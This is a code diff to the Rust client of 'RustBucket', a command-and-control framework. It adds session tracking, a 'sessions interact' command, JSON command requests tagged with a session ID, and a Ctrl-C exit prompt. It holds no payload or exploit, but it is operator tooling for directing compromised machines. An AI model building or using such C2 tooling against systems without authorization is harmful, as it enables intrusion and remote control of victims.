@@ -10,7 +10,7 @@ use std::io::{self, BufReader, Read, Write};
 use std::net::TcpStream;
 use std::sync::Arc;
 
-use rb::message::{CommandError, CommandOutput};
+use rb::message::{CommandError, CommandOutput, CommandRequest};
 
 // Represents the result from server
 #[derive(Debug, Deserialize)]
@@ -21,7 +21,7 @@ enum ServerResponse {
 }
 
 // Display command output with nice formatting and colors
-fn display_command_output(output: CommandOutput) {
+fn display_command_output(output: &CommandOutput) {
     match output {
         CommandOutput::Text(text) => {
             // Text output
@@ -120,7 +120,7 @@ fn display_command_output(output: CommandOutput) {
 }
 
 // Display command errors with appropriate colors
-fn display_command_error(error: CommandError) {
+fn display_command_error(error: &CommandError) {
     match error {
         CommandError::InvalidArguments(msg) => {
             eprintln!("{}: {}", "Invalid Arguments".bright_red().bold(), msg);
@@ -147,11 +147,50 @@ fn display_command_error(error: CommandError) {
 }
 
 // Custom prompt implementation with the requested name
-struct RustBucketPrompt;
+struct RustBucketPrompt {
+    // Current session ID if we're interacting with a session
+    active_session: Option<usize>,
+    // Info about the active session (could be expanded)
+    session_info: Option<String>,
+}
+
+impl RustBucketPrompt {
+    fn new() -> Self {
+        RustBucketPrompt {
+            active_session: None,
+            session_info: None,
+        }
+    }
+
+    // Set an active session
+    fn set_session(&mut self, session_id: usize, info: String) {
+        self.active_session = Some(session_id);
+        self.session_info = Some(info);
+    }
+
+    // Clear the active session
+    fn clear_session(&mut self) {
+        self.active_session = None;
+        self.session_info = None;
+    }
+}
 
 impl Prompt for RustBucketPrompt {
     fn render_prompt_left(&self) -> Cow<'_, str> {
-        Cow::Owned(format!("{} ", "RustBucket>".white().bold()))
+        match (self.active_session, &self.session_info) {
+            (Some(id), Some(info)) => {
+                // Session-specific prompt with session info
+                Cow::Owned(format!("{}[{}]> ", "Session".cyan().bold(), info.bright_cyan()))
+            }
+            (Some(id), None) => {
+                // Session-specific prompt with just ID
+                Cow::Owned(format!("{}[{}]> ", "Session".cyan().bold(), id.to_string().bright_cyan()))
+            }
+            _ => {
+                // Default prompt
+                Cow::Owned(format!("{} ", "RustBucket>".white().bold()))
+            }
+        }
     }
 
     fn render_prompt_right(&self) -> Cow<str> {
@@ -178,7 +217,7 @@ fn main() -> io::Result<()> {
     // Define command line arguments using clap
     let matches = Command::new("RustBucket Client")
         .version("1.0")
-        .author("RustBucket Developer")
+        .author("CaveiraGamingHD")
         .about("Command and Control Client for RustBucket Server")
         .arg(
             Arg::new("host")
@@ -410,7 +449,7 @@ fn main() -> io::Result<()> {
 
     // Create a new Reedline engine
     let mut line_editor = Reedline::create();
-    let prompt = RustBucketPrompt;
+    let mut prompt = RustBucketPrompt::new();
 
     let banner = r"
     ____             __  ____             __        __ 
@@ -423,16 +462,65 @@ fn main() -> io::Result<()> {
 
     println!("{}", banner.bright_yellow().bold());
 
+    // Track current active session
+    let mut active_session: Option<usize> = None;
+
     loop {
         let sig = line_editor.read_line(&prompt)?;
         match sig {
             Signal::Success(buffer) => {
-                if buffer.trim().is_empty() {
+                let input = buffer.trim();
+                if input.is_empty() {
                     continue;
                 }
 
+                // Check for session management commands
+                if input.starts_with("sessions interact") {
+                    // Parse session ID
+                    let parts: Vec<&str> = input.split_whitespace().collect();
+                    if parts.len() < 3 {
+                        eprintln!("{}", "Usage: session interact <session_id>".bright_red());
+                        continue;
+                    }
+
+                    if let Ok(session_id) = parts[2].parse::<usize>() {
+                        // Update active session
+                        active_session = Some(session_id);
+                        
+                        // Update prompt
+                        prompt.set_session(session_id, format!("Session {}", session_id));
+                        
+                        println!("{} {}", "Interacting with session".green(), session_id.to_string().bright_green());
+                        continue;
+                    } else {
+                        eprintln!("{}", "Invalid session ID".bright_red());
+                        continue;
+                    }
+                } else if input == "exit" && active_session.is_some() {
+                    // Exit session interaction mode
+                    active_session = None;
+                    prompt.clear_session();
+                    println!("{}", "Returned to main console".green());
+                    continue;
+                }
+
+                // Create a CommandRequest
+                let request = CommandRequest {
+                    command_line: input.to_string(),
+                    session_id: active_session,
+                };
+
+                // Serialize request to JSON
+                let json_request = match serde_json::to_string(&request) {
+                    Ok(json) => json,
+                    Err(e) => {
+                        eprintln!("{}: {}", "Failed to serialize command".bright_red(), e);
+                        continue;
+                    }
+                };
+
                 // Send the command to the server with a newline terminator
-                let command = format!("{}\n", buffer);
+                let command = format!("{}\n", json_request);
                 match &mut connection {
                     ConnectionType::Plain(stream) => {
                         stream.write_all(command.as_bytes())?;
@@ -488,10 +576,19 @@ fn main() -> io::Result<()> {
                         // We have a complete response
                         match response {
                             ServerResponse::Success(output) => {
-                                display_command_output(output);
+                                display_command_output(&output);
                             }
                             ServerResponse::Error(error) => {
-                                display_command_error(error);
+                                display_command_error(&error);
+                                
+                                // If we got a session error and we're in session mode, exit it
+                                if let CommandError::SessionError(_) | CommandError::NoActiveSession(_) = error {
+                                    if active_session.is_some() {
+                                        active_session = None;
+                                        prompt.clear_session();
+                                        println!("{}", "Session interaction ended".yellow());
+                                    }
+                                }
                             }
                         }
                         break;
@@ -499,7 +596,7 @@ fn main() -> io::Result<()> {
                     // If we couldn't parse yet, continue reading
                 }
             }
-            Signal::CtrlD | Signal::CtrlC => {
+            Signal::CtrlD => {
                 println!("\n{}", "Disconnecting from server...".yellow());
 
                 // Ensure proper shutdown if using TLS
@@ -511,6 +608,20 @@ fn main() -> io::Result<()> {
                 }
 
                 break Ok(());
+            }
+            Signal::CtrlC => {
+                println!("\n{}", "You sure you want to exit? (y/N)".yellow());
+                let mut input = String::new();
+                io::stdin()
+                    .read_line(&mut input)
+                    .expect("Failed to read line");
+                if input.trim().eq_ignore_ascii_case("y") {
+                    println!("{}", "Exiting...".red());
+                    break Ok(());
+                } else {
+                    println!("{}", "Continuing...".green());
+                }
+
             }
         }
     }
